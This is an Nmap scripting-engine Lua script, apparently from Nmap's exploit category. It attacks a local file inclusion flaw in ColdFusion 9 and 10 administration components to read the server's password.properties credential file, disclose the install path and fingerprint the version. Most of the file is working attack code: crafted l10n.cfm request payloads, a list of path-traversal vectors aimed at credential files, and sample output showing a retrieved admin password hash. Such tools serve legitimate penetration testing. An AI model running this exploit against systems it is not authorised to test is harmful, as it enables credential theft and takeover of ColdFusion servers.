description = [[
Attempts to retrieve version, absolute path of administration panel and the file 'password.properties' in vulnerable installations of ColdFusion 9 and 10.

This was based on the exploit 'ColdSub-Zero.pyFusion v2'.
]]

---
-- @usage nmap -sV --script http-coldfusion-subzero <target>
-- @usage nmap -p80 --script http-coldfusion-subzero --script-args basepath=/cf/ <target>
-- 
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-coldfusion-subzero: 
-- |   absolute_path: C:\inetpub\wwwroot\CFIDE\adminapi\customtags
-- |   version: 9
-- |   password_properties: #Fri Mar 02 17:03:01 CST 2012
-- | rdspassword=
-- | password=AA251FD567358F16B7DE3F3B22DE8193A7517CD0
-- |_encrypted=true
--
-- @xmloutput
-- <script id="http-coldfusion-subzero" output="&#xa;  installation_path: C:\inetpub\wwwroot\CFIDE\adminapi\customtags&#xa;  version: 9&#xa;  password_properties: #Fri Mar 02 17:03:01 CST 2012&#xd;&#xa;rdspassword=&#xd;&#xa;password=AA251FD567358F16B7DE3F3B22DE8193A7517CD0&#xd;&#xa;encrypted=true&#xd;&#xa;"><elem key="installation_path">C:\inetpub\wwwroot\CFIDE\adminapi\customtags</elem>
-- <elem key="version">9</elem>
-- <elem key="password_properties">#Fri Mar 02 17:03:01 CST 2012&#xd;&#xa;rdspassword=&#xd;&#xa;password=AA251FD567358F16B7DE3F3B22DE8193A7517CD0&#xd;&#xa;encrypted=true&#xd;&#xa;</elem>
-- </script>
-- @args http-coldfusion-subzero.basepath Base path. Default: /.
--
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit"}

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local url = require "url"

portrule = shortport.http

local PATH_PAYLOAD = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
local IMG_PAYLOAD = "CFIDE/administrator/images/loginbackground.jpg"
local LFI_PAYLOAD_FRAG_1 = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename="
local LFI_PAYLOAD_FRAG_2 = "&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
local CREDENTIALS_PAYLOADS = {
  "../../lib/password.properties",
  "..\\..\\lib\\password.properties",
  "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\lib\\password.properties",
  "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\cfusion\\lib\\password.properties",
  "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties",
  "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion9\\lib\\password.properties",
  "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion9\\cfusion\\lib\\password.properties",
  "../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties",
  "../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties",
  "../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties"
}

---
-- Extracts absolute path of installation by reading the ANALIZER_DIRECTORY value from the header 'set-cookie'
--
local function get_installation_path(host, port, basepath)
  local req = http.get(host, port, basepath..PATH_PAYLOAD)
  if req.header['set-cookie'] then
    stdnse.print_debug(1, "%s:Header 'set-cookie' detected in response.", SCRIPT_NAME)
    local _, _, path = string.find(req.header['set-cookie'], "path=/, ANALYZER_DIRECTORY=(.-);path=/")
    if path then
      stdnse.print_debug(1, "%s: Extracted path:%s", SCRIPT_NAME, path)
      return path
    end
  end
  return nil
end

---
-- Extracts version by comparing an image with known md5 checksums
--
local function get_version(host, port, basepath)
  local version = -1
  local img_req = http.get(host, port, basepath..IMG_PAYLOAD)
  if img_req.status == 200 then
    local md5chk = stdnse.tohex(openssl.md5(img_req.body))
    if md5chk == "a4c81b7a6289b2fc9b36848fa0cae83c" then
      stdnse.print_debug(1, "%s:CF version 10 detected.", SCRIPT_NAME)
      version = 10
    elseif md5chk == "596b3fc4f1a0b818979db1cf94a82220" then
      stdnse.print_debug(1, "%s:CF version 9 detected.", SCRIPT_NAME)
      version = 9
    elseif md5chk == "" then
      stdnse.print_debug(1, "%s:CF version 8 detected.", SCRIPT_NAME)
      version = 8
    else 
      stdnse.print_debug(1, "%s:Could not determine version.", SCRIPT_NAME)
      version = nil
    end
  end
  return version
end

---
-- Sends malicious payloads to exploit a LFI vulnerability and extract the credentials
local function exploit(host, port, basepath)
  for i, vector in ipairs(CREDENTIALS_PAYLOADS) do
    local req = http.get(host, port, basepath..LFI_PAYLOAD_FRAG_1..vector..LFI_PAYLOAD_FRAG_2)
      if req.body and string.find(req.body, "encrypted=true") then
        stdnse.print_debug(1, "%s: String pattern found. Exploitation worked with vector '%s'.", SCRIPT_NAME, vector)
        return true, req.body
      end
  end
end

action = function(host, port)
  local output_tab = stdnse.output_table()
  local basepath = stdnse.get_script_args(SCRIPT_NAME..".basepath") or "/"

  local installation_path = get_installation_path(host, port, basepath)
  local version_num = get_version(host, port, basepath)
  local status, file = exploit(host, port, basepath)

  if status then
    if version_num then
      output_tab.version = version_num
    end
    if installation_path then
      output_tab.installation_path = url.unescape(installation_path)
    end
    output_tab.password_properties = file
  else
    return nil
  end

  return output_tab
end
